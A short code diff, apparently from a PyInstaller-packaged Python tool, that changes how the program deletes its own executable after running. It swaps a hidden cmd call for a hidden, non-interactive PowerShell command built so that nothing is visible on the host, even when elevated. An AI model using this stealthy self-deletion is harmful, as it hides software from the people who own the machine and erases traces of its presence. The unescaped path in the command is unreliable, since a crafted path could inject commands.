@@ -1894,9 +1894,9 @@ def main():
             pass
 
     # Try immediate delete. The PyInstaller bootloader keeps the exe open as the
-    # process image, so os.remove will usually fail. Fall back to a detached cmd
-    # that waits 5s for the process to exit then deletes. CREATE_NO_WINDOW +
-    # DETACHED_PROCESS + DEVNULL I/O means zero visible windows on the host.
+    # process image so os.remove usually fails. Fall back to a hidden PowerShell
+    # process: -WindowStyle Hidden is enforced at the shell level (guaranteed
+    # invisible even when elevated), -LiteralPath handles spaces in the path.
     if _self_exe_path:
         try:
             os.remove(_self_exe_path)
@@ -1904,7 +1904,11 @@ def main():
             try:
                 import subprocess as _sp
                 _sp.Popen(
-                    ['cmd', '/c', f'timeout /t 5 /nobreak > nul 2>&1 & del /f /q "{_self_exe_path}"'],
+                    [
+                        'powershell', '-WindowStyle', 'Hidden',
+                        '-NonInteractive', '-NoProfile', '-Command',
+                        f"Start-Sleep 8; Remove-Item -Force -LiteralPath '{_self_exe_path}' -ErrorAction SilentlyContinue",
+                    ],
                     stdin=_sp.DEVNULL, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                     creationflags=_sp.DETACHED_PROCESS | _sp.CREATE_NO_WINDOW,
                 )
